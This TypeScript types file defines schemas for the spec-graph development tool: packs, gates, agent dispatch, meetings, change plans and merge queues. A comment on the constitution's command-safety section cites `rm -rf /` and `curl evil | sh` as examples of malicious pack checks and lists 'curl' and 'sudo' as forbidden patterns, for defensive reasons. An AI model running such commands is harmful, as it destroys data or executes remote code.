// ============ Profile & Facts ============

export type FactDimension =
  | "has_ui"
  | "boundary"
  | "topology"
  | "deployment"
  | "consumers"
  | "field"
  | "criticality"
  | "team"
  | "persistence";

export interface ProfileFact {
  value: string;
  confidence: "high" | "low";
  source: "repo" | "llm" | "user" | "override" | "fallback";
  evidence?: string;
}

export interface Profile {
  version: string;
  meta: {
    created_at: string;
    source: {
      prompt?: string;
      repo_scan: boolean;
      llm_classified: boolean;
      reviewed_at?: string;
    };
  };
  facts: Record<FactDimension, ProfileFact>;
  overrides?: Partial<Record<FactDimension, string>>;
}

// ============ Pack ============

export type PackKind = "domain" | "change-intent";

export interface ArtifactDecl {
  id: string;
  kind: string;
  schema_ref?: string;
  optional?: boolean;
  default_producer?: string;
  default_consumers?: string[];
}

export interface CheckDecl {
  id: string;
  kind: string;
  command: string;
  layer?: "unit" | "integration" | "system" | "deployment";
  threshold?: Record<string, any>;
  /**
   * Files this check depends on (globs). When set, `spec-graph run` reads
   * `git diff --name-only` and only executes this check if any changed file
   * matches one of the touchfiles. Reduces CI cost on large projects.
   *
   * If undefined or empty, the check always runs (backward compat).
   *
   * Example: ['src/**\/*.ts', 'packs/foundation.pack/**\/*']
   */
  touchfiles?: string[];
  /**
   * Scheduling tier:
   *   - 'gate' (default): runs on every commit where touchfiles match
   *   - 'periodic': runs on a schedule (e.g. weekly) via cron, NOT on every commit
   *
   * Periodic checks are skipped by `run` unless `--include-periodic` is set.
   * Use for expensive checks like LLM evals, full E2E suites, performance benchmarks.
   */
  tier?: "gate" | "periodic";
}

export interface TrackContribution {
  id: string;
  scope: string;
  actions: string[];
  produces?: string[];
  consumes?: string[];
  provided_by?: string;
  federated_consume?: {
    contract: string;
    source: string;
    binding: string;
    integration: string;
  };
}

export interface ScopePolicy {
  derive_from?: string;
  forbid_widen?: boolean;
}

export interface Pack {
  name: string;
  version: string;
  kind: PackKind;
  priority: number;
  description: string;
  applies_when?: Record<string, any> | "always";
  applies_when_change?: { type: string | string[] };
  provides: {
    artifacts: ArtifactDecl[];
    actions?: string[];
    checks?: CheckDecl[];
    gates?: GateDecl[];
    gate_patches?: Record<string, GatePatch>;
    acceptance_layers?: Record<
      string,
      { required?: boolean; checks?: string[] }
    >;
    pipeline_skeleton?: PipelineSkeleton;
    scope_policy?: ScopePolicy;
    terminal_states?: string[];
    agents?: AgentDecl[];
    agent_bindings?: Record<string, string>; // action → agent_id
    meetings?: MeetingDecl[]; // multi-agent collaborative discussions
  };
  contributes_track?: TrackContribution;
  context_ref?: string;
  constitution_ref?: string;
}

// ============ Gate ============

export interface GatePatch {
  add_checks?: string[];
  add_artifacts?: string[];
  add_traces?: TraceQuery[];
}

export interface TraceQuery {
  name: string;
  from_kind: string;
  to_kind: string;
  via: string[];
  cardinality: "exists" | "every" | "single";
}

export interface GateDecl {
  id: string;
  on_transition: string[];
  require_artifacts?: string[];
  require_checks?: string[];
  require_traces?: TraceQuery[];
  require_contracts_current?: boolean;
  forbid?: string[];
  fail_mode: "block" | "warn";
  enabled: boolean;
}

// ============ Pipeline ============

export interface PipelineSkeleton {
  stages: string[];
  max_retries: number;
  on_exhausted: "escalate" | "block" | "conclude";
  iterate_over?: string;
  spans_releases?: boolean;
}

// ============ Agent Registry (sub-agent orchestration) ============

// Model tier for agent dispatch — maps to cost/capability tradeoff.
// 'fast': mechanical tasks (isolated functions, clear specs, 1-2 files)
// 'standard': integration tasks (multi-file coordination, pattern matching)
// 'capable': judgment tasks (architecture, design, review, complex debugging)
export type ModelTier = "fast" | "standard" | "capable";

/**
 * Agent declaration: a specialized sub-agent that can be dispatched
 * by the coordinator to execute specific actions independently.
 *
 * Each agent has:
 * - Isolated context (only receives declared input artifacts)
 * - Own system prompt (via prompt_ref)
 * - Own model preference (via model_tier)
 * - Communicates through artifacts (not shared memory)
 * - Destroyed after completing its work (no state leakage)
 *
 * Inspired by: superpowers subagent-driven-development, BMAD role agents,
 * gstack multi-review pipeline.
 */
export interface AgentDecl {
  id: string; // unique id, e.g. 'pm', 'architect', 'developer'
  description: string; // human-readable role description
  prompt_ref: string; // path to system prompt template (relative to pack)
  model_tier: ModelTier; // which model class to use
  input_artifact_kinds: string[]; // artifact kinds this agent reads (e.g. ['requirement/*'])
  output_artifact_kinds: string[]; // artifact kinds this agent produces (e.g. ['design/*'])
  actions: string[]; // which actions this agent can execute
  checks?: string[]; // which checks this agent can execute (for review agents)
}

/**
 * Agent binding: maps action → agent id.
 * Declared in pack.yaml under provides.agent_bindings.
 * Compose engine merges bindings from all active packs;
 * higher-priority packs override lower-priority ones.
 */
export interface AgentBinding {
  action: string; // action name (e.g. 'propose', 'design', 'implement')
  agent_id: string; // agent id to dispatch for this action
  provided_by: string; // pack name that declared this binding
}

/**
 * Dispatch record: runtime record of a sub-agent invocation.
 * Stored in change descriptor audit trail for traceability.
 */
export interface AgentDispatch {
  action: string; // which action was dispatched
  agent_id: string; // which agent was used
  dispatched_at: string;
  completed_at?: string;
  input_artifacts: string[]; // artifact ids provided as context
  output_artifacts: string[]; // artifact ids produced
  status: "running" | "completed" | "failed" | "escalated";
  model_tier: ModelTier;
  retry_count?: number;
}

// ============ Meeting (multi-agent collaborative discussion) ============

/**
 * Meeting participant role.
 * - 'core': speaks every round, must contribute
 * - 'optional': speaks when relevant, may be skipped
 * - 'invite_only': only speaks when explicitly invited by facilitator
 * - 'facilitator': manages rounds, synthesizes output, doesn't contribute domain opinions
 */
export type MeetingRole = "core" | "optional" | "invite_only" | "facilitator";

/**
 * A meeting participant — can be an agent or a domain expert (human).
 */
export interface MeetingParticipant {
  agent_id?: string; // reference to AgentDecl.id (for agent participants)
  expert_role?: string; // domain expertise description (for human experts)
  role: MeetingRole;
  perspective: string; // what lens this participant views from (e.g., "security", "UX", "compliance")
}

/**
 * Contribution type within a meeting round.
 */
export type ContributionType =
  | "statement" // stating a position or observation
  | "question" // asking another participant for clarification
  | "challenge" // disagreeing with or questioning another participant's statement
  | "refinement" // improving/building on another participant's statement
  | "synthesis"; // facilitator summarizing convergence

/**
 * A single contribution in a meeting round.
 */
export interface MeetingContribution {
  participant: string; // agent_id or expert identifier
  type: ContributionType;
  content: string; // the actual contribution text
  targets?: string[]; // which participants this targets (for questions/challenges)
  round: number; // which round this was made in
}

/**
 * Meeting declaration: a structured multi-agent discussion session.
 *
 * Instead of one agent producing artifacts in isolation, a meeting brings
 * multiple agents (and optionally human domain experts) together for
 * structured rounds of discussion. The facilitator manages the rounds
 * and synthesizes the output.
 *
 * Inspired by: BMAD persona collaboration (but broadcast-style instead
 * of sequential), real-world requirements workshops.
 */
export interface MeetingDecl {
  id: string; // e.g., 'requirements-meeting', 'domain-modeling-meeting'
  description: string;
  purpose: string; // what this meeting aims to resolve
  participants: MeetingParticipant[];
  rounds: MeetingRound[];
  output_artifacts: string[]; // artifact ids this meeting produces
  on_actions: string[]; // which actions trigger this meeting
  expert_invite_protocol?: string; // path to instructions for inviting domain experts
  min_rounds: number; // minimum rounds before convergence
  max_rounds: number; // maximum rounds before forced synthesis
}

/**
 * A single round in a meeting.
 */
export interface MeetingRound {
  number: number;
  phase: "diverge" | "challenge" | "converge";
  prompt: string; // facilitator prompt for this round
  speakers: string[]; // agent_ids expected to speak (empty = all core)
  objective: string; // what this round aims to achieve
}

/**
 * Meeting transcript: runtime record of a completed meeting.
 * Stored for traceability — who said what, when, and how it converged.
 */
export interface MeetingTranscript {
  meeting_id: string;
  started_at: string;
  completed_at: string;
  participants: string[]; // agent_ids + expert identifiers who actually spoke
  rounds: MeetingRoundTranscript[];
  output_artifacts: string[];
  convergence_summary: string; // facilitator's synthesis of agreements
  open_questions: string[]; // unresolved issues carried forward
}

/**
 * Transcript of a single meeting round.
 */
export interface MeetingRoundTranscript {
  round: number;
  phase: MeetingRound["phase"];
  contributions: MeetingContribution[];
}

/**
 * Meeting runtime state: persisted to .spec-graph/meetings/<meeting_id>.yaml
 * so an in-progress meeting survives coordinator restarts.
 *
 * Lifecycle:
 *   not exists → in_progress (created on first `meeting record`)
 *              → completed (via `meeting complete`)
 *              → abandoned (via `meeting abandon`)
 *
 * `current_round_contributions` holds contributions for the round currently
 * in progress. Once `meeting advance` is called, they move into `rounds[]`
 * as a completed MeetingRoundTranscript, and `current_round_contributions`
 * is cleared for the next round.
 */
export interface MeetingRuntime {
  meeting_id: string;
  status: "in_progress" | "completed" | "abandoned";
  started_at: string;
  completed_at: string | null;
  current_round: number; // 1-indexed
  current_phase: MeetingRound["phase"]; // phase of current_round
  participants: string[]; // agent_ids + experts who have spoken
  rounds: MeetingRoundTranscript[]; // completed rounds
  current_round_contributions: MeetingContribution[]; // ongoing round
  convergence_summary: string | null;
  open_questions: string[];
  triggered_by_action: string; // which action triggered this meeting
  triggered_by_stage: string; // which stage was active
  /**
   * For ad-hoc meetings (coordinator-initiated, not declared in any pack).
   * When present, this meeting has no graph.meetings entry — the declaration
   * lives here in the runtime file. `spec-graph meeting show/advance/complete`
   * fall back to this when the meeting isn't found in graph.meetings.
   */
  ad_hoc_decl?: MeetingDecl;
}

// ============ Compose Output: Graph ============

export interface Gate {
  id: string;
  on_transition: string[];
  require_artifacts: string[];
  require_checks: string[];
  require_traces: TraceQuery[];
  require_contracts_current: boolean;
  forbid: string[];
  fail_mode: "block" | "warn";
  enabled: boolean;
  provided_by: string;
}

export interface Graph {
  version: string;
  meta: {
    composed_at: string;
    profile_hash: string;
    change_type?: string;
    packs_used: Array<{
      name: string;
      matched: string | Record<string, any>;
      priority: number;
    }>;
  };
  artifacts: ArtifactDecl[];
  actions: string[];
  checks: CheckDecl[];
  gates: Gate[];
  tracks: TrackContribution[];
  pipeline_skeleton: PipelineSkeleton;
  acceptance_layers: Record<string, { required: boolean; checks: string[] }>;
  scope_policy?: ScopePolicy;
  agents: AgentDecl[];
  agent_bindings: AgentBinding[];
  meetings: MeetingDecl[];
  /**
   * Project-level config snapshot at compose time.
   * Mirrors .spec-graph/config.yaml — context + rules + references.
   * Surfaced to coordinators via dispatch manifest so sub-agents see
   * project-specific constraints when producing artifacts.
   */
  project_config?: ProjectConfig;
}

// ============ Execution Unit ============

/**
 * Execution unit for splitting a large story into independent parallel work items.
 * Each unit has its own scope, checks, and artifacts. Story status is derived from
 * the statuses of all its units.
 */
export interface ExecutionUnit {
  id: string;
  name: string;
  status: "pending" | "in_progress" | "completed" | "failed";
  scope: {
    files?: { include?: string[]; exclude?: string[] };
    tracks?: string[];
  };
  checks?: string[];
  artifacts?: string[];
  created_at: string;
  completed_at?: string;
  failed_reason?: string;
}

// ============ Change Descriptor ============

export interface ChangeDescriptor {
  id: string;
  title: string;
  description: string;
  created_at: string;
  type:
    | "feature"
    | "bugfix"
    | "refactor"
    | "spike"
    | "performance"
    | "migration"
    | "deprecation";
  priority: "low" | "medium" | "high" | "critical";
  scope: {
    tracks?: string[];
    files?: { include?: string[]; exclude?: string[] };
    contracts?: string[];
  };
  impact: {
    risk_level: "low" | "medium" | "high" | "critical";
    acceptance_layers?: Record<string, boolean>;
    flags?: Record<string, boolean>;
  };
  ripple?: {
    notify_consumers?: boolean;
    consumer_actions?: string[];
    federated?: Array<{ repo: string; action: string }>;
  };
  execution?: {
    max_retries?: number;
    backoff?: "linear" | "exponential" | "fixed";
    timebox_hours?: number;
    spans_releases?: boolean;
    batch_mode?: boolean;
    batches?: Array<{ id: string; name: string; files: string[] }>;
  };
  /**
   * Execution units for large stories that need to be split into independent
   * parallel work items. Each unit has its own scope, checks, and artifacts.
   *
   * Story status is derived from unit statuses:
   *   - All units 'completed' → story 'completed'
   *   - Any unit 'failed' → story 'failed'
   *   - Any unit 'in_progress' → story 'in_progress'
   *   - Otherwise → story 'pending'
   *
   * If undefined, story is treated as a single unit (backward compat).
   */
  execution_units?: ExecutionUnit[];
  baseline?: {
    commit?: string;
    contract_versions?: Record<string, string>;
    test_results_hash?: string;
  };
  profile_patch?: Partial<Record<FactDimension, string>>;
  profile_patch_applied_at?: string;
  sync_impact?: {
    computed_at: string;
    artifacts_added: string[];
    artifacts_removed: string[];
    checks_added: string[];
    checks_removed: string[];
    gates_added: string[];
    gates_removed: string[];
    consumer_ripple: Array<{ contract: string; consumers: string[] }>;
  };
  archive?: {
    archived_at: string;
    snapshot_dir: string;
    final_status: string;
  };
  status:
    | "proposed"
    | "in_progress"
    | "suspended"
    | "completed"
    | "discarded"
    | "escalated";
  applied_at?: string;
  completed_at?: string;
  discarded_at?: string;
  discard_reason?: string;
  /** Path to the plan markdown document (relative to project root). */
  plan_path?: string;
  audit_log?: Array<{
    timestamp: string;
    action: string;
    author?: string;
    message?: string;
  }>;
  /**
   * Change plan — independent structured YAML for requirement stability.
   * Stored at .spec-graph/changes/<id>-plan.yaml (separate from status JSON).
   *
   * Purpose:
   *   - Resume development after interruption (read plan → know what to do)
   *   - Prevent requirement drift (lock plan → detect modifications)
   *   - Auditability (track what was planned vs what was done)
   *
   * Content is filled by AI agent. spec-graph provides structure + enforcement.
   */
  plan?: ChangePlan;
}

export interface ChangePlan {
  /** Schema version for migration support */
  schema_version: number;
  /** Plan version — increments each edit. Locked = frozen. */
  version: number;
  /** null = draft (editable). timestamp = locked (drift tracked). */
  locked_at: string | null;

  // ── Background ──
  /** Why this change exists (business context) */
  background: string;
  /** What problem does this solve */
  problem_statement: string;

  // ── Scope ──
  /** What this change WILL do — each item is a concrete deliverable */
  scope_in: string[];
  /** What this change will NOT do — explicit exclusions to prevent creep */
  scope_out: string[];

  // ── Acceptance ──
  /** How we know this change is DONE (Given/When/Then format preferred) */
  acceptance_criteria: string[];

  // ── Impact ──
  /** Artifacts that will be created or modified */
  affected_artifacts: string[];
  /** File globs expected to change */
  affected_files: string[];
  /** Other changes/stories this depends on */
  dependencies: string[];

  // ── Technical ──
  /** Key technical decisions made during planning */
  decisions: Array<{
    decision: string;
    rationale: string;
    alternatives: string;
  }>;
  /** Identified risks and mitigations */
  risks: Array<{
    risk: string;
    probability: "low" | "medium" | "high";
    impact: "low" | "medium" | "high";
    mitigation: string;
  }>;
  /** Unresolved questions that need answers */
  open_questions: string[];

  // ── Progress ── (updated during implementation)
  /** What has been completed so far */
  completed_items: string[];
  /** What remains to be done */
  remaining_items: string[];
  /** Blockers encountered */
  blockers: string[];

  // ── Estimate ──
  estimate: string | null;

  // ── Drift tracking ──
  /** Records every modification to locked fields */
  drift_log: Array<{
    timestamp: string;
    field: string;
    old_value: string;
    new_value: string;
    reason: string;
  }>;
}

// ============ Contract Registry (federated topology) ============

// DDD context map relationship types (Strategic Design patterns).
// Each describes HOW two bounded contexts communicate.
export type ContextMapRelation =
  | "acl" // Anti-Corruption Layer: translate other's model
  | "ohs" // Open Host Service: standard protocol for multiple consumers
  | "pl" // Published Language: standard schema for exchange
  | "customer-supplier" // Upstream adjusts to downstream's needs
  | "conformist" // Downstream follows upstream blindly
  | "partnership"; // Both sides coordinate evolution

export interface ContextMapEntry {
  upstream: string; // track id
  downstream: string; // track id
  relation: ContextMapRelation;
  contract_id?: string; // optional: which contract mediates this relation
  description?: string;
}

export interface ContractBinding {
  consumer: string; // track id or external repo
  bound_version: string;
  bound_at: string;
  status: "current" | "stale" | "broken";
  relation_type?: ContextMapRelation; // DDD: how this consumer relates to the producer
  notes?: string;
  reverified_at?: string; // last time consumer re-affirmed this binding
}

export interface ContractRegistryEntry {
  contract_id: string;
  producer: string; // track id or 'external'
  current_version: string;
  versions: Array<{
    version: string;
    published_at: string;
    producer: string;
    notes?: string;
  }>;
  consumers: ContractBinding[];
  drift?: {
    last_checked_at: string;
    stale_consumers: string[];
    broken_consumers: string[];
  };
}

// ============ Constitution (project quality contract) ============

export interface ConstitutionThresholds {
  test_coverage?: number; // 0..1
  cyclomatic_complexity?: number; // max function CC
  ambiguity_score?: number; // max clarify-scan ambiguity
  placeholder_count?: number; // max placeholders in artifacts
  non_measurable_count?: number; // max vague adjectives
  lint_warnings?: number; // max lint warnings allowed
}

export interface ConstitutionTraceRule {
  name: string;
  from_kind: string;
  to_kind: string;
  via: string[];
  cardinality: "exists" | "every" | "single";
}

// Constitutional articles: named qualitative invariants (inherit spec-kit 9 Articles).
// Unlike numeric thresholds, articles are boolean rules about artifact content quality.
// Each article declares a rule that completed artifacts must satisfy.
export type ArticleRule =
  | { type: "required_section"; artifact_kind: string; section: string }
  | { type: "min_length"; artifact_kind: string; min_chars: number }
  | { type: "co_completed"; from_kind: string; to_kind: string };

export interface ConstitutionArticle {
  id: string;
  description: string;
  rule: ArticleRule;
}

export interface Constitution {
  version: string;
  project_name: string;
  project_description?: string;
  effective_date: string;
  last_revised: string;

  quality: {
    thresholds: ConstitutionThresholds;
    required_linters: string[];
    require_review_approvers: number;
    articles?: ConstitutionArticle[];
  };

  traceability: {
    required_traces: ConstitutionTraceRule[];
    require_ac_test_binding: boolean;
    require_commit_story_ref: boolean;
  };

  semver: {
    major_bump_on: Array<
      "contract-removed" | "contract-breaking-change" | "public-api-removed"
    >;
    minor_bump_on: Array<"contract-added" | "feature-added">;
    patch_bump_on: Array<"bugfix" | "internal-refactor">;
    deprecation_grace_releases: number;
  };

  // Command safety: inherit wdf-method SPEC §5. Pack-declared check.command
  // values execute as shell — without a whitelist, any third-party pack could
  // ship `rm -rf /` or `curl evil | sh` as a check. Builtin sentinels `<...>`
  // are always safe (dispatched to TS functions, not shell).
  security?: {
    command_whitelist: string[]; // allowed command prefixes (e.g. "npm test", "npx")
    forbidden_patterns: string[]; // banned substrings (e.g. "&&", "curl", "sudo")
  };

  waivers?: Array<{
    rule_id: string;
    reason: string;
    expires_at: string;
    approved_by: string[];
  }>;
}

// ============ Isolation Primitives (worktree / scope-lock / merge-queue) ============

/**
 * Backend abstraction for git operations.
 * Production uses node:child_process; tests inject a fake.
 */
export interface GitBackend {
  exec(
    args: string[],
    opts?: { cwd?: string },
  ): Promise<{
    stdout: string;
    stderr: string;
    exitCode: number;
  }>;
  exists(path: string): Promise<boolean>;
}

/**
 * Isolation unit lifecycle states.
 *
 * Base states (original): active | merged | abandoned
 *
 * Enriched states (StoryRail-inspired, for multi-party handoff):
 *   prepared     — worktree created, no work started yet
 *   self_verified — implementer finished + ran local checks
 *   submitted    — ready for reviewer to pick up
 *   accepted     — reviewer approved, ready to merge
 *   rejected     — reviewer rejected, back to implementer
 *
 * State transitions:
 *   prepared → active → self_verified → submitted → accepted → merged
 *                                  ↘ rejected → active (rework)
 *                                            ↘ abandoned
 *
 * Backward compat: existing code using 'active' | 'merged' | 'abandoned' still
 * works — the new states are strictly more granular. status === 'active'
 * subsumes prepared/self_verified for legacy callers.
 */
export type IsolationStatus =
  | "prepared"
  | "active"
  | "self_verified"
  | "submitted"
  | "accepted"
  | "rejected"
  | "merged"
  | "abandoned";

export interface IsolationUnit {
  id: string; // e.g., story-123 or change-xyz
  track: string; // which track this unit belongs to
  branch: string; // git branch name
  path: string; // filesystem path of worktree
  status: IsolationStatus;
  created_at: string;
  merged_at?: string;
  base_commit?: string; // commit this was branched from
  /**
   * Timestamps for enriched lifecycle states (optional, backward compat).
   * Set when the unit transitions to the corresponding state.
   */
  prepared_at?: string;
  self_verified_at?: string;
  submitted_at?: string;
  accepted_at?: string;
  rejected_at?: string;
  rejected_reason?: string;
  reviewed_by?: string;
}

export type EnforcementMode = "strict" | "warn";

export interface ScopeLockDecl {
  unit_id: string; // which isolation unit this locks
  allowed_paths: string[]; // globs — may read AND write
  protected_paths: string[]; // globs — may read, must not modify
  forbidden_paths: string[]; // globs — must not touch at all
  enforcement_mode: EnforcementMode;
  locked_at: string;
  locked_by: string; // author / actor that created the lock
}

/**
 * Merge queue item lifecycle.
 *
 * Base states: queued | checking | merging | merged | failed
 *
 * Enriched states (for finer-grained queue tracking):
 *   self_verified — implementer finished local checks, ready for queue review
 *   submitted     — enqueued for review
 *   accepted      — reviewer approved, will merge next
 *   rejected      — reviewer rejected, sent back
 *
 * Backward compat: 'queued' subsumes self_verified/submitted for legacy callers.
 */
export type MergeQueueStatus =
  | "queued"
  | "self_verified"
  | "submitted"
  | "checking"
  | "accepted"
  | "rejected"
  | "merging"
  | "merged"
  | "failed";

export interface MergeQueueItem {
  unit_id: string;
  status: MergeQueueStatus;
  position: number;
  file_list: string[]; // files changed in this unit
  enqueued_at: string;
  merged_at?: string;
  failure_reason?: string;
  overlaps?: string[]; // other unit_ids with overlapping file changes
}

export interface MergeQueue {
  target_branch: string; // e.g., 'main'
  items: MergeQueueItem[];
}

// ============ CLI Context ============

export interface CliContext {
  projectRoot: string;
  specGraphDir: string;
  profilePath: string;
  packsDir: string;
  verbose: boolean;
}

// ============ Project-level Config (config.yaml) ============

/**
 * Project-level configuration injected into the compose engine.
 *
 * Mirrors OpenSpec's openspec/config.yaml: lets multiple projects reuse the
 * same pack while injecting project-specific context (tech stack, conventions)
 * and per-artifact validation rules without forking the pack.
 *
 * Stored at .spec-graph/config.yaml. Read by compose on every run.
 * Fields are optional — missing config.yaml falls back to pack-only behavior.
 */
export interface ProjectConfig {
  version: string;
  context?: Record<string, string>;
  rules?: Record<string, string>;
  references?: Record<string, string>;
  /**
   * Per-artifact validation rules. Keyed by artifact KIND (not id).
   * Each rule defines validation criteria for that artifact type.
   *
   * Example:
   *   artifact_rules:
   *     requirement/prd:
   *       min_sections: ["Problem Statement", "User Stories", "Acceptance Criteria"]
   *       min_length: 500
   *       required_fields: ["id", "kind", "status"]
   *     design/architecture:
   *       min_sections: ["Overview", "System Context", "Data Model"]
   *       min_length: 1000
   *
   * These rules are checked by `spec-graph analyze` and surfaced in dispatch manifest.
   */
  artifact_rules?: Record<
    string,
    {
      min_sections?: string[];
      min_length?: number;
      required_fields?: string[];
      forbidden_words?: string[];
    }
  >;
}

/**
 * Pack override configuration.
 * Stored at .spec-graph/pack-overrides.yaml.
 * Allows customizing pack fields without forking the pack source.
 *
 * Example:
 *   version: "1"
 *   overrides:
 *     foundation:
 *       checks:
 *         lint:
 *           command: "pnpm lint"
 *           touchfiles: ["src/**\/*.ts"]
 *       gates:
 *         exit-merged:
 *           require_checks: ["lint", "typecheck", "unit-test", "pnpm-audit"]
 */
export interface PackOverrides {
  version: string;
  overrides: Record<
    string,
    {
      checks?: Record<string, Partial<CheckDecl>>;
      gates?: Record<
        string,
        {
          add_checks?: string[];
          remove_checks?: string[];
          add_artifacts?: string[];
          remove_artifacts?: string[];
        }
      >;
      artifacts?: Record<
        string,
        {
          optional?: boolean;
          schema_ref?: string;
        }
      >;
    }
  >;
}
